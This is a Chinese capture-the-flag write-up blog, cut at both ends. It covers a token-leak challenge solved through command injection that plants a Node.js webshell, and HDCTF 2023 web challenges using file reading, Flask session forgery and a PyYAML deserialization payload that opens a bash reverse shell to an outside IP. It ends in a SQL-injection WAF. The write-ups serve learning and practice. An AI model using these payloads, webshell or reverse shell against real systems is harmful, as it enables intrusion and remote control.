class="string">&#x27;transfer-encoding&#x27;</span>: <span class="string">&#x27;chunked&#x27;</span>, <span class="string">&#x27;connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>, <span class="string">&#x27;content-encoding&#x27;</span>: <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;x-target-env&#x27;</span>: <span class="string">&#x27;prod_with_canary&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>Response</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Response&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;RequestId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1b4dee8f-afce-4495-8e8b-d776c8097397&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DepotData&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Depots&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span> <span class="number">10467875</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leak-source-code&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;HttpsUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://e.coding.net/vuln-git/leak-token-leak-git/leak-source-code.git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;ProjectId&quot;</span><span class="punctuation">:</span> <span class="number">11680350</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;SshUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git@e.coding.net:vuln-git/leak-token-leak-git/leak-source-code.git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;WebUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://vuln-git.coding.net/p/leak-token-leak-git/d/leak-source-code&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;VcsType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;ProjectName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leak-token-leak-git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Got there!&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;CreatedAt&quot;</span><span class="punctuation">:</span> <span class="number">1678157728000</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;LastPushAt&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Page&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;PageNumber&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PageSize&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;TotalPage&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;TotalRow&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>发现要登陆 尝试获取 sshkey</p><p>创建 sshkey</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl https://e.coding.net/open-api -H <span class="string">&quot;Authorization: token e(This_Is_real_Token)c&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;Action&quot;: &quot;CreateSshKey&quot;,</span></span><br><span class="line"><span class="string">  &quot;Title&quot;: &quot;Hacker&quot;,</span></span><br><span class="line"><span class="string">  &quot;Content&quot;: &quot;ssh-rsa AAAA== rsatest&quot;,</span></span><br><span class="line"><span class="string">  &quot;ExpirationDate&quot;: &quot;9999-12-31&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"><span class="comment"># python usage</span></span><br><span class="line">python ./digging-shell.py add_ssh_key sshkey.rsa</span><br></pre></td></tr></table></figure><p>成功后 <code>git clone git@e.coding.net:XXXXX/XXXX/XXXX.git</code></p><h3 id="项目源代码"><a href="#项目源代码" class="headerlink" title="项目源代码"></a>项目源代码</h3><p>进行审计。 把起来项目跑起来。</p><p>可以在 api 文件夹中找到一个 /v3/UpdateAllProduct.js 文件 这个文件也是可以使用的 api 在 html 主页中可以找到对应的文件泄漏。</p><p>存在命令注入的可能 注入非常的简单 projectName 之类的参数都可以注入 因为这些是直接拼接进去的。</p><blockquote><p>正式的题目环境应该是禁止反向 shell 连接出来的</p><p>第一种办法是纯粹的无回显的布尔命令注入</p><p>但是这里滥用一下代码中的存在的 js CGI 魔法 我们可以尝试写入一个 webshell js 来进行 Getshell </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">use as curl</span></span><br><span class="line">curl &quot;https://127.0.0.1/v3/UpdateAllProduct&quot; \</span><br><span class="line">         -H &#x27;x-coding-event: ping1&#x27; \</span><br><span class="line">         -X POST -k \</span><br><span class="line">         --data-raw &quot;artifact.artifactRepoName=12&amp;artifact.artifactPkgName=\&quot;;echo $&#123;BASE64WEBSHELL&#125;|base64 -d &gt; /app/api/v2/badWebShell.js #\&quot;&amp;artifact.artifactVersionName=1.4&amp;artifact.projectName=testing&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">python usage</span></span><br><span class="line">python digging-shell.py upload_shell ./upload_shell.js https://nodejs-hack.cloud.eson.ninja </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://nodejs-hack.cloud.eson.ninja replace your url 不要加 / 我的服务是禁止nodejs 外连其他服务 所以会导致内部的js的命令拼接执行时候的 curl 失效，导致一次 500 ，否则会返回服务正常更新的 json</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">output like following</span></span><br><span class="line">ic| file_data: &#x27;Y29uc3&lt;base64ed file data&gt;AAA=&#x27;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">.....</span><br><span class="line">httpx.ReadTimeout: The read operation timed out</span><br></pre></td></tr></table></figure><p>其中 BASE64WEBSHELL 的值为 js webshell 的样本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const path = require(&#x27;path&#x27;)</span><br><span class="line">const &#123; execSync &#125; = require(&#x27;child_process&#x27;)</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    // API POST</span><br><span class="line">    async post(request, response) &#123;</span><br><span class="line">        // console.log(request.params)</span><br><span class="line">        artifactPkgName = request.params.artifactPkgName</span><br><span class="line">        // Save Path</span><br><span class="line">        const localDir = __dirname</span><br><span class="line">        // curl command</span><br><span class="line">        const curlCMD = artifactPkgName</span><br><span class="line">        // Create Path</span><br><span class="line">        fs.mkdirSync(localDir, &#123; recursive: true &#125;)</span><br><span class="line">        // download artificate</span><br><span class="line">        ResponseData = execSync(curlCMD, &#123; cwd: localDir &#125;).toString()</span><br><span class="line">        // Response</span><br><span class="line">        response.success(ResponseData)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于 pm2 会自动托管和加载 api 文件夹下的 js 文件 所以我们可以直接访问 webshell</p><p>webshell 链接地址为 <a href="https://127.0.0.1/v2/badWebShell">https://127.0.0.1/v2/badWebShell</a> 请求方式为 POST </p><p>POST Form 的内容为 ‘artifactPkgName={CMD}’</p><p>参考 check-shell 函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python ./digging-shell.py get_shell https://nodejs-hack.cloud.eson.ninja <span class="built_in">ls</span> <span class="comment"># replace ls as your command. and replace https://nodejs-hack.cloud.eson.ninja as your url and also no / behind.</span></span><br><span class="line">ic| <span class="built_in">command</span>: <span class="string">&#x27;ls&#x27;</span></span><br><span class="line">ic| resp.status_code: 200</span><br><span class="line">badWebShell.js</span><br><span class="line">coding</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p>拿到 webshell 之后 cat /flag 即可拿到 flag</p><blockquote><p>flag 是 mount 进入容器进程中的 不要放到 /app 目录下即可</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HDCTF-2023-WEB</title>
      <link href="/posts/5f20f300.html"/>
      <url>/posts/5f20f300.html</url>
      
        <content type="html"><![CDATA[<p><strong>这里的话是只记录自己不会的知识点</strong></p><h2 id="HDCTF-2023-YamiYami"><a href="#HDCTF-2023-YamiYami" class="headerlink" title="[HDCTF 2023]YamiYami"></a>[HDCTF 2023]YamiYami</h2><p><img src="../images/image-20230423142920377.png" alt="image-20230423142920377"></p><p>这是一个考点，考查的是yaml 的python反序列化</p><p><a href="https://xz.aliyun.com/t/7923">可以看看这篇文章来了解一下YAML</a></p><p><a href="https://xz.aliyun.com/t/11082#toc-11">Python反序列化漏洞分析</a></p><p>这里的话就是一共有三种python反序列化类型</p><p><strong>pickle YAML Marshal </strong> </p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="../images/image-20230423145759804.png" alt="image-20230423145759804"></p><p>这里的话有三个选项可以进去进行查看，然后点进Read something会发现他的url是可以进行文件读取的</p><p><img src="../images/image-20230423150002768.png" alt="image-20230423150002768"></p><p>于是进行尝试，这里的话直接读文件的是读取不了的，得需要用<code>file</code>伪协议来进行读取</p><p><img src="../images/image-20230423150317306.png" alt="image-20230423150317306"></p><p>成功进行读取</p><p>但是这里不知道flag名称，所以不能进行读取，但是能可以尝试读取一下环境变量</p><p><strong>那么这就是非预期解了</strong></p><p><img src="../images/image-20230423150830780.png" alt="image-20230423150830780"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node2.anna.nssctf.cn:28523/read?url=file:///../../../../../proc/1/environ</span><br></pre></td></tr></table></figure><p>这里<code>/proc/1/environ</code>的意思就是<strong>进程为1的环境变量</strong></p><p><code>/proc/x/envrion</code>这就是查看任意进程的环境变量的方法</p><p>查看进程   <code>ps aux</code></p><p><strong>a：显示当前终端下的所有进程信息，包括其他用户的进程。</strong></p><p><strong>u：使用以用户为主的格式输出进程信息。</strong></p><p><strong>x：显示当前用户在所有终端下的进程。</strong></p><p><strong>预期解</strong></p><p>​    </p><p><img src="../images/image-20230423151647481.png" alt="image-20230423151647481"></p><p>查看pwd发现当前目录是<code>/app</code>，于是尝试用刚才的方法进行<code>/app/app.py</code>源码的读取，因为直接<code>url/app.py</code>的话是读取不到的</p><p><img src="../images/image-20230423152137758.png" alt="image-20230423152137758"></p><p>正常读取的时候发现有正则过滤，于是查了一下</p><p><a href="https://www.cnblogs.com/xieshengsen/p/6727064.html">[正则表达式 re.findall 用法]</a></p><p>那么这里的话不成功是因为，这里匹配到url里的<code>app.*</code>，然后以app.*的数组形式返回，然后导致查不到结果，于是我们可以使用双重url编码绕过</p><p><img src="../images/image-20230423152629528.png" alt="image-20230423152629528"></p><p>双重url绕过后成功读取到了源码</p><p><strong>源码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re, random, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">False</span></span><br><span class="line">BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">   <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST:</span><br><span class="line">       <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230423153527975.png" alt="image-20230423153527975"></p><p>需要做的事情就2件，伪造Cookie，Yaml反序列化，那么Cookie怎么拿呢？key的种子是由<code>uuid.getnode()</code>生成的，网上检索一波</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 python 中使用 uuid 模块生成 UUID（通用唯一识别码）。可以使用 uuid.getnode() 方法来获取计算机的硬件地址，这个地址将作为 UUID 的一部分。</span><br></pre></td></tr></table></figure><p>因为审计源码发现，在上传完yaml反序列化的payload后，进入boogipop的这个路由得需要<code>seesion</code>的值为<code>Welcome To HDCTF2023</code></p><p><img src="../images/image-20230423153706421.png" alt="image-20230423153706421"></p><p>这里就是考查的是利用<strong>uuid</strong>来进行session伪造</p><p>种子是通过<code>random.seed(uuid.getnode())</code>生成的。而uuid.getnode()又是将MAC地址转换为10进制。那么我们通过程序中的任意文件读取来获取网卡地址。不就能得到种子了<br>读取/proc/net/dev可以知道服务器上的网卡。接着/sys/class/net/eth0/address可以知道MAC地址</p><p><img src="../images/image-20230423155637069.png" alt="image-20230423155637069"></p><p>然后进行进制转化</p><p><img src="../images/image-20230423160417630.png" alt="image-20230423160417630"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:45:95</span><br><span class="line">2485376927125</span><br></pre></td></tr></table></figure><p>然后获取密钥来进行session伪造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="built_in">int</span>(<span class="number">52234918416</span>))</span><br><span class="line">SECRET_KEY = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line"><span class="built_in">print</span>(SECRET_KEY)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230423160653384.png" alt="image-20230423160653384"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">231.28194338656192</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>然后拿着密钥去进行session伪造</p><p><a href="https://github.com/noraj/flask-session-cookie-manager">session伪造工具</a></p><p><img src="../images/image-20230423161334979.png" alt="image-20230423161334979"></p><p>然后根据源码进行修改passport为<code>Welcome To HDCTF2023</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;passport&#x27;: &#x27;Welcome To HDCTF2023&#x27;&#125;</span><br></pre></td></tr></table></figure><p>然后进行编码</p><p><img src="../images/image-20230423161614597.png" alt="image-20230423161614597"></p><p>伪造成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.ZETpRg.LJFqsGZPtbnl8N6Ngul7lMTWXgU</span><br></pre></td></tr></table></figure><p>然后先进行paylaod的文件上传</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">!!python/<span class="built_in">object</span>/new:<span class="built_in">str</span></span><br><span class="line">    args: []</span><br><span class="line">    state: !!python/<span class="built_in">tuple</span></span><br><span class="line">      - <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/6666 &lt;&amp;1\&quot;&#x27;)&quot;</span></span><br><span class="line">      - !!python/<span class="built_in">object</span>/new:<span class="built_in">staticmethod</span></span><br><span class="line">        args: []</span><br><span class="line">        state:</span><br><span class="line">          update: !!python/name:<span class="built_in">eval</span></span><br><span class="line">          items: !!python/name:<span class="built_in">list</span></span><br></pre></td></tr></table></figure><p><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">关于yaml反序列化的payload</a></p><p>还有很多详细的解释都在里面</p><p>然后就能成功弹到shell了</p><p><strong>总结</strong></p><p>file://伪协议读取源码</p><p>/proc/1/environ 环境变量读取</p><p>正则表达式 re.findall 用法  两次url编码绕过</p><p>uuid进行session伪造</p><p>YAML反序列化</p><h2 id="HDCTF-2023-LoginMaster-quine注入"><a href="#HDCTF-2023-LoginMaster-quine注入" class="headerlink" title="[HDCTF 2023]LoginMaster(quine注入)"></a>[HDCTF 2023]LoginMaster(quine注入)</h2><p>考点</p><p><img src="../images/image-20230424100905511.png" alt="image-20230424100905511"></p><p>这里的话先去了解一下unique注入是啥东西</p><p><a href="https://nosec.org/home/detail/2395.html">详解Laravel 5.8 SQL注入漏洞(unique注入)</a></p><p><strong>漏洞详情</strong></p><p><strong>该漏洞存在于Laravel的表单验证功能，漏洞函数为ignore()，漏洞文件位于/vendor/laravel/ramework/src/Illuminate/Validation/Rules/Unique.php。有时候开发者希望在进行字段唯一性验证时忽略指定字段以及字段值，通常会调用Rule类的ignore方法。该方法有两个参数，第一个参数为字段值，第二个参数为字段名，当字段名为空时，默认字段名为“id”。如果用户可以控制ignore()方法的参数值，就会产生SQL注入漏洞。</strong></p><p>这里的话就扫一下目录发现存在robots.txt文件，然后进行读取，发现存在waf文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span 